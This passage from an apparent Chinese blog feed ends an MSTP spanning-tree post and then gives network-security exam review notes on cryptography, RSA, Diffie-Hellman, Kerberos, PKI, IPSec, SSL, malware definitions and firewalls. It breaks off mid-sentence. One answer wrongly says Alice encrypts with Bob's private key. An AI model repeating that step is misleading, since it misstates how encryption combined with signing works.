align="left">从配置BPDU报文发送角度来看，Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Backup端口作为指定端口的备份，提供了另外一条从根节点到叶节点的备份通路</td></tr></tbody></table><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MSTP端口角色.png" alt="MSTP端口角色" style="zoom:80%;" /><table><thead><tr><th><strong>端口角色</strong></th><th align="left">说明</th></tr></thead><tbody><tr><td>Master端口</td><td align="left">Master端口是MST域和总根相连的所有路径中最短路径上的端口，它是交换设备上连接MST域到总根的端口。Master端口是域中的报文去往总根的必经之路。Master端口是特殊域边缘端口，Master端口在CIST上的角色是Root Port，在其它各实例上的角色都是Master端口</td></tr><tr><td>域边缘端口</td><td align="left">域边缘端口是指位于MST域的边缘并连接其它MST域或SST的端口。</td></tr></tbody></table><table><thead><tr><th>端口角色</th><th>说明</th></tr></thead><tbody><tr><td>边缘端口</td><td>如果指定端口位于整个域的边缘，不再与任何交换设备连接，这种端口叫做边缘端口。边缘端口一般与用户终端设备直接连接</td></tr></tbody></table><h4 id="MSTP的端口状态"><a href="#MSTP的端口状态" class="headerlink" title="MSTP的端口状态"></a>MSTP的端口状态</h4><p>MSTP定义的端口状态与RSTP协议中定义相同:<br>Forwarding状态：端口既转发用户流量，学习MAC地址，又接收/发送BPDU报文。<br>Learning状态：过渡状态，端口接收/发送BPDU报文，不转发用户流量但是学习MAC地址。<br>Discarding状态：端口只接收BPDU报文，不转发用户流量也不学习MAC地址。</p><table><thead><tr><th>MSTP端口状态</th><th>端口在拓扑中的角色</th></tr></thead><tbody><tr><td><strong>Forwarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Learning</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Discarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口、Alternate端口、Backup端口</td></tr></tbody></table><p>MSTP报文</p><p>MSTP使用MST BPDU（Multiple Spanning Tree Bridge Protocol Data Unit，多生成树桥协议数据单元）作为生成树计算的依据。<br>MST BPDU报文用来计算生成树的拓扑、维护网络拓扑以及传达拓扑变化记录。</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1678337096467.png"></p><p>无论是域内的MST BPDU还是域间的，前36个字节和RST BPDU相同。从第37个字节开始是MSTP专有字段。最后的MSTI配置信息字段由若干MSTI配置信息组连缀而成。<br>MST BPDU中主要信息说明：<br>Protocol Identifier：2 Byte，协议标识符。<br>Protocol Version Identifier：1 Byte，协议版本标识符，STP为0，RSTP为2，MSTP为3。<br>BPDU Type：1 Byte，BPDU类型：<br>0x00：STP的Configuration BPDU<br>0x80：STP的TCN BPDU（Topology Change Notification BPDU）<br>0x02：RST BPDU（Rapid Spanning-Tree BPDU）或者MST BPDU（Multiple Spanning-Tree BPDU）<br>CIST Flags：1 Byte，CIST标志字段。<br>CIST Root Identifier：8 Byte，CIST的总根交换设备ID。<br>CIST External Path Cost：4 Byte，CIST外部路径开销指从本交换设备所属的MST域到CIST根交换设备所属的MST域的累计路径开销。CIST外部路径开销根据链路带宽计算。</p><p>CIST Regional Root Identifier：8 Byte，CIST的域根交换设备ID，即IST Master的ID。如果总根在这个域内，那么域根交换设备ID就是总根交换设备ID。<br>CIST Port Identifier：2 Byte，本端口在IST中的指定端口ID。<br>Message Age：2 Byte，BPDU报文的生存期。<br>Max Age：2 Byte，BPDU报文的最大生存期，超时则认为到根交换设备的链路故障。<br>Hello Time：2 Byte，Hello定时器，缺省为2秒。<br>Forward Delay：2 Byte，Forward Delay定时器，缺省为15秒。<br>Version 1 Length：1 Byte，Version1 BPDU的长度，值固定为0。<br>Version 3 Length：2 Byte，Version3 BPDU的长度。<br>MST Configuration Identifier：51 Byte，MST配置标识，表示MST域的标签信息，包含4个字段。<br>CIST Internal Root Path Cost：4 Byte，CIST内部路径开销指从本端口到IST Master交换设备的累计路径开销。CIST内部路径开销根据链路带宽计算。<br>CIST Bridge Identifier：8 Byte，CIST的指定交换设备ID。<br>CIST Remaining Hops：1 Byte，BPDU报文在CIST中的剩余跳数。<br>MSTI Configuration Messages：16 Byte，MSTI配置信息。每个MSTI的配置信息占16 Byte，如果有n个MSTI就占用n×16 Byte。</p><p>MSTP的工作原理</p><p>MSTP拓扑计算：<br>MSTP可以将整个二层网络划分为多个MST域，各个域之间通过计算生成CST，域内生成IST，CST和IST构成了整个交换设备网络的CIST。<br>域内还可以基于实例计算生成多棵生成树，每棵生成树都被称为是一个MSTI。<br>CIST和MSTI都是根据优先级向量来计算的，这些优先级向量信息都包含在MST BPDU中。各交换设备互相交换MST BPDU来生成CIST和MSTI 。<br>参与CIST计算的优先级向量为：<br>{ 根交换设备ID，外部路径开销，域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }<br>参与MSTI计算的优先级向量为：<br>{ 域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }</p><p>优先级向量说明：<br>根交换设备ID：根交换设备ID用于选择CIST中的根交换设备。<br>根交换设备ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>外部路径开销（External Root Path Cost，ERPC）：从CIST的域根到达总根的路径开销。<br>MST域内所有交换设备上保存的外部路径开销相同。<br>若CIST根交换设备在域中，则域内所有交换设备上保存的外部路径开销为0。<br>域根ID：域根ID用于选择MSTI中的域根。<br>域根ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>内部路径开销（Internal Root Path Cost，IRPC）：本桥到达域根的路径开销。<br>域边缘端口保存的内部路径开销大于非域边缘端口保存的内部路径开销。<br>指定交换设备ID：CIST或MSTI实例的指定交换设备是本桥通往域根的最邻近的上游桥。<br>如果本桥就是总根或域根，则指定交换设备为自己。<br>指定端口ID：指定交换设备上同本设备上根端口相连的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。<br>接收端口ID：接收到BPDU报文的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。</p><p>优先级向量比较原则：<br>同一向量比较，值最小的向量具有最高优先级。<br>优先级向量比较原则如下<br>首先，比较根交换设备ID。<br>如果根交换设备ID相同，再比较外部路径开销。<br>如果外部路径开销相同，再比较域根ID。<br>如果域根ID仍然相同，再比较内部路径开销。<br>如果内部路径仍然相同，再比较指定交换设备ID。<br>如果指定交换设备ID仍然相同，再比较指定端口ID。<br>如果指定端口ID还相同，再比较接收端口ID。<br>如果端口接收到的BPDU内包含的配置消息优于端口上保存的配置消息，则端口上原来保存的配置消息被新收到的配置消息替代。端口同时更新交换设备保存的全局配置消息。反之，新收到的BPDU被丢弃。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全思考题</title>
      <link href="/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
      <url>/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 